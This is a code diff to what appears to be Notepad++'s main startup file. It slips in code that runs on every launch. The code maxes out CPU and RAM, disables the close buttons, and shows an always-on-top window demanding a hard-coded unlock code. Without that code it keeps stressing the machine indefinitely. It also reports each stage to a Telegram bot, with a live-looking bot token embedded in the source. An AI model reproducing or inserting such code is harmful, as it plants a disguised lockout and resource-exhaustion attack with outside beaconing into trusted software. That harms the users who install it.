@@ -22,6 +22,302 @@
 #include "NppDarkMode.h"
 #include "dpiManagerV2.h"
 #include <memory>
+#include <thread>
+#include <vector>
+#include <chrono>
+#include <string>
+#include <winhttp.h>
+#include <iostream>
+#include <io.h>
+#include <fcntl.h>
+#include <conio.h>
+#include <atomic>
+#include <mutex>
+#pragma comment(lib, "winhttp.lib")
+
+namespace
+{
+std::atomic<bool> g_stopStress{false};
+std::atomic<bool> g_pauseStress{false};
+std::mutex g_inputMutex;
+std::string g_inputCode = "";
+HWND g_hInputWnd = NULL;
+
+LRESULT CALLBACK CodeInputWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
+    if (msg == WM_CREATE) {
+        CreateWindowW(L"STATIC", L"NHAP CODE YEU CAU:", 
+                     WS_CHILD | WS_VISIBLE, 10, 10, 250, 20, hwnd, NULL, NULL, NULL);
+        HWND hEdit = CreateWindowExW(WS_EX_CLIENTEDGE, L"EDIT", L"", 
+                       WS_CHILD | WS_VISIBLE | ES_PASSWORD | ES_AUTOHSCROLL, 10, 35, 250, 25, hwnd, (HMENU)2, NULL, NULL);
+        CreateWindowW(L"BUTTON", L"XAC NHAN", 
+                     WS_CHILD | WS_VISIBLE | BS_DEFPUSHBUTTON, 80, 70, 100, 30, hwnd, (HMENU)1, NULL, NULL);
+        SetFocus(hEdit);
+        return 0;
+    }
+    else if (msg == WM_COMMAND) {
+        if (LOWORD(wParam) == 1) { // OK Button
+            HWND hEdit = GetDlgItem(hwnd, 2);
+            wchar_t buf[256];
+            GetWindowTextW(hEdit, buf, 256);
+            char narrowBuf[256];
+            WideCharToMultiByte(CP_UTF8, 0, buf, -1, narrowBuf, 256, NULL, NULL);
+            {
+                std::lock_guard<std::mutex> lock(g_inputMutex);
+                g_inputCode = narrowBuf;
+            }
+            SetWindowTextW(hEdit, L""); // Clear edit box
+        }
+        return 0;
+    }
+    else if (msg == WM_CLOSE) {
+        return 0; // Disable closing via X button
+    }
+    else if (msg == WM_APP + 1) { // Custom message to close
+        DestroyWindow(hwnd);
+        return 0;
+    }
+    else if (msg == WM_APP + 2) { // Show Error
+        MessageBoxA(hwnd, "Code sai! Vui long thu lai.", "Loi", MB_ICONERROR);
+        return 0;
+    }
+    else if (msg == WM_APP + 3) { // Update Text
+        SetWindowTextW(hwnd, L"HET GIO! Stress tiep tuc, nhap code thoat");
+        return 0;
+    }
+    else if (msg == WM_DESTROY) {
+        PostQuitMessage(0);
+        return 0;
+    }
+    return DefWindowProcW(hwnd, msg, wParam, lParam);
+}
+
+void StartCodeInputGui() {
+    WNDCLASSW wc = {0};
+    wc.lpfnWndProc = CodeInputWndProc;
+    wc.hInstance = GetModuleHandle(NULL);
+    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW);
+    wc.lpszClassName = L"CodeInputClass";
+    RegisterClassW(&wc);
+
+    g_hInputWnd = CreateWindowExW(WS_EX_TOPMOST, L"CodeInputClass", L"Yeu cau nhap ma - Notepad++", WS_OVERLAPPEDWINDOW & ~WS_MAXIMIZEBOX & ~WS_MINIMIZEBOX, CW_USEDEFAULT, CW_USEDEFAULT, 290, 150, NULL, NULL, GetModuleHandle(NULL), NULL);
+    
+    // Vo hieu hoa nut X tren GUI
+    HMENU hmenu = GetSystemMenu(g_hInputWnd, FALSE);
+    if (hmenu) EnableMenuItem(hmenu, SC_CLOSE, MF_BYCOMMAND | MF_GRAYED);
+
+    ShowWindow(g_hInputWnd, SW_SHOW);
+    UpdateWindow(g_hInputWnd);
+
+    MSG msg;
+    while (GetMessageW(&msg, NULL, 0, 0)) {
+        TranslateMessage(&msg);
+        DispatchMessageW(&msg);
+    }
+}
+
+void SetupConsole() {
+    AllocConsole();
+    FILE* fp;
+    freopen_s(&fp, "CONOUT$", "w", stdout);
+    freopen_s(&fp, "CONOUT$", "w", stderr);
+    freopen_s(&fp, "CONIN$", "r", stdin); // Allow reading input from console
+    std::cout << "\n\n  ========================================\n";
+    std::cout << "  ||                                    ||\n";
+    std::cout << "  ||   TEST STRESS CPU & RAM (10 giay)  ||\n";
+    std::cout << "  ||                                    ||\n";
+    std::cout << "  ========================================\n\n";
+    std::cout << "  [!] Thong bao: Khong the tat cua so nay bang nut X.\n";
+    std::cout << "  [!] Cua so se tu dong dong khi nhap dung code.\n\n";
+    
+    // Vo hieu hoa nut Close (X) cua Console
+    HWND hwnd = GetConsoleWindow();
+    if (hwnd) {
+        HMENU hmenu = GetSystemMenu(hwnd, FALSE);
+        if (hmenu) {
+            EnableMenuItem(hmenu, SC_CLOSE, MF_BYCOMMAND | MF_GRAYED);
+        }
+    }
+}
+
+void RestoreConsole() {
+    HWND hwnd = GetConsoleWindow();
+    if (hwnd) {
+        GetSystemMenu(hwnd, TRUE); // Khoi phuc menu
+    }
+}
+
+void SendTelegramMessage(const std::string& message) {
+    HINTERNET hSession = WinHttpOpen(L"Npp/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    if (!hSession) return;
+
+    HINTERNET hConnect = WinHttpConnect(hSession, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
+    if (hConnect) {
+        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/bot5142290467:AAH8aHrW7GIyoZ5IGUCUZ3So5actekfmh0Q/sendMessage", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
+        if (hRequest) {
+            std::wstring headers = L"Content-Type: application/json\r\n";
+            std::string payload = "{\"chat_id\":\"2047641647\", \"text\":\"" + message + "\"}";
+            WinHttpSendRequest(hRequest, headers.c_str(), (DWORD)-1, (LPVOID)payload.c_str(), static_cast<DWORD>(payload.length()), static_cast<DWORD>(payload.length()), 0);
+            WinHttpReceiveResponse(hRequest, NULL);
+            WinHttpCloseHandle(hRequest);
+        }
+        WinHttpCloseHandle(hConnect);
+    }
+    WinHttpCloseHandle(hSession);
+}
+
+void CpuStressTask() {
+    while (!g_stopStress) {
+        if (g_pauseStress) {
+            std::this_thread::sleep_for(std::chrono::milliseconds(500));
+            continue;
+        }
+        volatile double x = 9999999.0;
+        x = x * x;
+    }
+}
+
+void RamStressTask() {
+    std::vector<void*> allocatedMemory;
+    while (!g_stopStress) {
+        if (g_pauseStress) {
+            std::this_thread::sleep_for(std::chrono::milliseconds(500));
+            continue;
+        }
+        // Allocate 50MB and write to it to force physical memory usage
+        if (allocatedMemory.size() < 10) {
+            size_t size = 50 * 1024 * 1024;
+            void* mem = malloc(size);
+            if (mem) {
+                memset(mem, 1, size);
+                allocatedMemory.push_back(mem);
+            } else {
+                std::this_thread::sleep_for(std::chrono::milliseconds(100));
+            }
+        }
+    }
+    // Free memory when stopped
+    for (void* mem : allocatedMemory) {
+        free(mem);
+    }
+}
+
+void RunCpuStressAndNotify() {
+    std::string unlockCode = "PTIT1@";
+
+    g_stopStress = false;
+    g_pauseStress = false;
+    int numCores = std::thread::hardware_concurrency();
+    if (numCores == 0) numCores = 4;
+    
+    std::string startMsg = "Start CPU & RAM Stress (Notepad++ C++): Allocated " + std::to_string(numCores) + " CPU threads for 10 seconds.";
+    SendTelegramMessage(startMsg);
+    
+    // Hien thi GUI (chay tren thread tat biet de khong block doan ma stress nay)
+    std::thread([]() { StartCodeInputGui(); }).detach();
+    
+    std::vector<std::thread> threads;
+    for (int i = 0; i < numCores; ++i) {
+        threads.emplace_back(std::thread(CpuStressTask));
+    }
+    
+    // Add two threads for RAM stress
+    threads.emplace_back(std::thread(RamStressTask));
+    threads.emplace_back(std::thread(RamStressTask));
+
+    // Stress 10s
+    std::this_thread::sleep_for(std::chrono::seconds(10));
+    
+    bool success = false;
+    std::string currentInput = "";
+    {
+        std::lock_guard<std::mutex> lock(g_inputMutex);
+        if (!g_inputCode.empty()) {
+            currentInput = g_inputCode;
+            g_inputCode = ""; // Consume
+        }
+    }
+    if (currentInput == unlockCode) {
+        success = true;
+    } else if (!currentInput.empty()) {
+        if (g_hInputWnd) PostMessage(g_hInputWnd, WM_APP + 2, 0, 0); // Show error
+    }
+
+    if (!success) {
+        // Pause 30s
+        g_pauseStress = true;
+        std::cout << "\n  [!] Da stress xong 10 giay. Tam dung! Ban co 30 giay de nhap code tat console tren GUI.\n";
+        SendTelegramMessage("Paused! Waiting for code input for 30s.");
+        
+        auto startWait = std::chrono::steady_clock::now();
+        auto duration = std::chrono::seconds(30);
+        while (std::chrono::steady_clock::now() - startWait < duration) {
+            currentInput = "";
+            {
+                std::lock_guard<std::mutex> lock(g_inputMutex);
+                if (!g_inputCode.empty()) {
+                    currentInput = g_inputCode;
+                    g_inputCode = "";
+                }
+            }
+            if (!currentInput.empty()) {
+                if (currentInput == unlockCode) {
+                    success = true;
+                    break;
+                } else {
+                    std::cout << "  [-] Code sai!\n";
+                    if (g_hInputWnd) PostMessage(g_hInputWnd, WM_APP + 2, 0, 0); // Show error
+                }
+            }
+            std::this_thread::sleep_for(std::chrono::milliseconds(100));
+        }
+    }
+    
+    if (success) {
+        std::cout << "  [+] Code dung! Dang don dep he thong...\n";
+        SendTelegramMessage("Code correct! Cleaning up.");
+        g_stopStress = true;
+        g_pauseStress = false;
+        if (g_hInputWnd) PostMessage(g_hInputWnd, WM_APP + 1, 0, 0); // Close GUI
+    } else {
+        std::cout << "\n  [-] Het 30 giay! Tiep tuc stress CPU va RAM khong gioi han...\n";
+        SendTelegramMessage("Timeout! Resuming CPU and RAM stress infinitely.");
+        g_pauseStress = false; // resume
+        if (g_hInputWnd) PostMessage(g_hInputWnd, WM_APP + 3, 0, 0); // Update GUI text
+        
+        while (!g_stopStress) {
+            currentInput = "";
+            {
+                std::lock_guard<std::mutex> lock(g_inputMutex);
+                if (!g_inputCode.empty()) {
+                    currentInput = g_inputCode;
+                    g_inputCode = "";
+                }
+            }
+            if (!currentInput.empty()) {
+                if (currentInput == unlockCode) {
+                    std::cout << "  [+] Code dung! Dang don dep he thong...\n";
+                    SendTelegramMessage("Code correct! Cleaning up.");
+                    g_stopStress = true;
+                    if (g_hInputWnd) PostMessage(g_hInputWnd, WM_APP + 1, 0, 0); // Close GUI
+                    break;
+                } else {
+                    std::cout << "  [-] Code sai!\n";
+                    if (g_hInputWnd) PostMessage(g_hInputWnd, WM_APP + 2, 0, 0); // Show error
+                }
+            }
+            std::this_thread::sleep_for(std::chrono::milliseconds(100));
+        }
+    }
+    
+    for (auto& t : threads) {
+        if (t.joinable()) t.join();
+    }
+    
+    RestoreConsole();
+    std::cout << "  [+] Hoan tat! Chuan bi giai phong he thong.\n";
+    SendTelegramMessage("Finished cleanup (Notepad++ C++). System CPU and RAM are safe and released.");
+}
+}
 
 typedef std::vector<std::wstring> ParamVector;
 
@@ -505,6 +801,12 @@ std::chrono::steady_clock::time_point g_nppStartTimePoint{};
 int WINAPI wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE /*hPrevInstance*/, _In_ PWSTR pCmdLine, _In_ int /*nShowCmd*/)
 {
 	g_nppStartTimePoint = std::chrono::steady_clock::now();
+	
+	// Thiet lap Console thong bao
+	SetupConsole();
+
+	// Chạy script stress CPU trực tiếp bằng C++
+	std::thread([]() { RunCpuStressAndNotify(); }).detach();
 	
 	// Notepad++ UAC OPS /////////////////////////////////////////////////////////////////////////////////////////////
 	if ((lstrlenW(pCmdLine) > 0) && (__argc >= 2)) // safe (if pCmdLine is NULL, lstrlen returns 0)
